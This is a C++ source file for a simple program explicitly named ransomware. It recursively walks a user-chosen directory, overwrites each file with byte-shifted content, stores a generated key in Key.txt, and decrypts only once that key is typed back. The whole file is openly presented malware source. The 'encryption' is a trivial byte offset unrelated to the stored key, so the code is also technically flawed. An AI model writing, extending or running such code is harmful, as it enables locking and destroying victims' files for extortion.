#include "ransomware.hpp"

Ransomware::Ransomware()
{
   _random = rand();
}

Ransomware::~Ransomware()
{
}

void Ransomware::generate_key(void)
{
	std::string			const filename("Key.txt");
	std::ofstream		file_key(filename.c_str());
	static const char	alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string			temp_string;
   srand(time(NULL));

	for (int i = 0; i < 63; ++i) {
		_key.push_back(alphanum[rand() % (63 - 1)]);
	}
	if (file_key)
	{
		file_key << _key;
	}
	else
		throw Ransomware::Error(1, "Error for open the Key.txt file", 2);
   file_key.close();
}

void Ransomware::encryptFILE(std::string filepath)
{
   std::fstream file, tempFile;
   std::string  temp_file_hide = ".temp.txt";
   char byte;
   char aes;

   file.open(filepath, std::ios::in);
   tempFile.open(temp_file_hide, std::ios::out);

   while (file >> std::noskipws >> byte)
   {
      tempFile << byte;
   }
   file.close();
   tempFile.close();

   file.open(filepath, std::ios::out);
   tempFile.open(temp_file_hide, std::ios::in);
   while (tempFile >> std::noskipws >> byte)
   {
      byte += _random;
      file << byte;
   }
   file.close();
   tempFile.close();
   remove(temp_file_hide.c_str());
}

void Ransomware::decryptFILE(std::string filepath)
{
   std::fstream file, tempFile;
   std::string  temp_file_hide = ".temp.txt";
   char byte;

   file.open(filepath, std::ios::in);
   tempFile.open(temp_file_hide, std::ios::out);

   while (file >> std::noskipws >> byte)
   {
      tempFile << byte;
   }

   file.close();
   tempFile.close();

   file.open(filepath, std::ios::out);
   tempFile.open(temp_file_hide, std::ios::in);
   while (tempFile >> std::noskipws >> byte)
   {
      byte -= _random;
      file << byte;
   }
   file.close();
   tempFile.close();
   remove(temp_file_hide.c_str());
}


void Ransomware::encryptDIR(std::string filepath)
{
	DIR                  *directory;
   struct dirent        *entry;
   struct stat          status;
   std::string          path;
   std::cout << filepath.c_str() << std::endl;
   if ((directory = opendir(filepath.c_str())) != NULL) // Open the folder
   {
      while ((entry = readdir(directory)) != NULL) // Loop as long as the directory is not empty
      {
         if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check if this entry is different of . or ... If it is, that means it's a file
         {
            path = filepath + "\\" + entry->d_name;
            std::cout << path.c_str() << std::endl;
            stat(path.c_str(), &status);
            if (S_ISDIR(status.st_mode)) // Here the current file is a repetory so we start the function again 
               Ransomware::encryptDIR(path);
            else 
               Ransomware::encryptFILE(path); // Here the current file is indeed a file so we encrypt it
         }
      }
   }
   else
      throw Ransomware::Error(1, "Error for open the directory", 2);
}

void Ransomware::decryptDIR(std::string filepath)
{
   DIR                  *directory;
   struct dirent        *entry;
   struct stat          status;
   std::string          path;
   std::cout << filepath.c_str() << std::endl;
   if ((directory = opendir(filepath.c_str())) != NULL) // Open the folder
   {
      while ((entry = readdir(directory)) != NULL) // Loop as long as the directory is not empty
      {
         if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) // Check if this entry is different of . or ... If it is, that means it's a file
         {
            path = filepath + "\\" + entry->d_name;
            std::cout << path.c_str() << std::endl;
            stat(path.c_str(), &status);
            if (S_ISDIR(status.st_mode)) // Here the current file is a repetory so we start the function again 
               Ransomware::decryptDIR(path);
            else 
               Ransomware::decryptFILE(path); // Here the current file is indeed a file so we encrypt it
         }
      }
   }
   else
      throw Ransomware::Error(1, "Error for open the directory", 2);
}

int main(void)
{
   Ransomware ransomware;
   std::string prompt;
   std::string directory;
   std::cout << "Please, enter a directory to encrypt:";
   std::getline(std::cin, directory);
   try 
   {
      ransomware.generate_key();
      ransomware.encryptDIR(directory);
      while (1)
      {
         std::cout << "Please, enter the key for decrypt your directory :";
         std::getline(std::cin, prompt);
         if (prompt.compare(ransomware._key) == 0)
         {
            std::cout << "Your directory is decrypted";
            remove("Key.txt");
            ransomware.decryptDIR(directory);
            return (1);
         }
      }
   }
   catch (std::exception const &e)
   {
      std::cerr << "ERROR :" << e.what() << std::endl;
   }

   return (0);
}